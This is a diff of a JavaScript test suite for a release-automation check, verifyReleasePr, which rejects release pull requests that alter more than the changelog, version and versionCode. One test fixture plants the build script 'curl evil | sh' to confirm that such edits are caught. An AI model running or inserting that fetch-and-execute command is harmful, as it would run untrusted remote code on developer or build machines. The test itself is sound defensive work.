@@ -44,22 +44,25 @@ describe('release-automation', () => {
   describe('verifyReleasePr', () => {
     const base = changelog('### Added\n- New.\n', RELEASED);
     const plan = planChangelogBump(base, '0.6.0', '2026-11-27');
-    const pkg = (version, extra = {}) => `${JSON.stringify({ name: 'tens', version, scripts: { build: 'vite build' }, ...extra }, null, 2)}\n`;
-    const args = { baseChangelog: base, basePackage: pkg('0.6.0'), headChangelog: plan.nextText, headPackage: pkg('0.7.0') };
+    const pkg = (version, extra = {}) => `${JSON.stringify({ name: 'tens', version, versionCode: 260728000, scripts: { build: 'vite build' }, ...extra }, null, 2)}\n`;
+    // RELEASED has no 2026-11-27 section, so the bump's versionCode is that day's first: 261127000.
+    const head = (version, extra = {}) => pkg(version, { versionCode: 261127000, ...extra });
+    const args = { baseChangelog: base, basePackage: pkg('0.6.0'), headChangelog: plan.nextText, headPackage: head('0.7.0') };
 
     it('accepts exactly the bump-version result', () => {
       expect(verifyReleasePr(args)).toEqual({ ok: true, version: '0.7.0' });
     });
     it('accepts the --major result (RELEASE_MAJOR promotion to 1.0.0)', () => {
       const major = planChangelogBump(base, '0.6.0', '2026-11-27', { forceMajor: true });
-      expect(verifyReleasePr({ ...args, headChangelog: major.nextText, headPackage: pkg('1.0.0'), allowMajor: true })).toEqual({ ok: true, version: '1.0.0' });
-      const denied = verifyReleasePr({ ...args, headChangelog: major.nextText, headPackage: pkg('1.0.0') });
+      expect(verifyReleasePr({ ...args, headChangelog: major.nextText, headPackage: head('1.0.0'), allowMajor: true })).toEqual({ ok: true, version: '1.0.0' });
+      const denied = verifyReleasePr({ ...args, headChangelog: major.nextText, headPackage: head('1.0.0') });
       expect(denied.ok).toBe(false);
       expect(denied.reason).toMatch(/--allow-major/);
     });
     it.each([
-      ['wrong version', { headPackage: pkg('0.6.1') }, /expected 0.7.0/],
-      ['other package.json edits', { headPackage: pkg('0.7.0', { scripts: { build: 'curl evil | sh' } }) }, /more than the "version" field/],
+      ['wrong version', { headPackage: head('0.6.1') }, /expected 0.7.0/],
+      ['other package.json edits', { headPackage: head('0.7.0', { scripts: { build: 'curl evil | sh' } }) }, /more than the/],
+      ['wrong versionCode', { headPackage: head('0.7.0', { versionCode: 261127001 }) }, /more than the/],
       ['edited notes', { headChangelog: plan.nextText.replace('- New.', '- Sneaky.') }, /differs/],
       ['nothing to release', { baseChangelog: changelog('### Added\n', RELEASED) }, /nothing to release/],
     ])('rejects %s', (_name, override, reason) => {
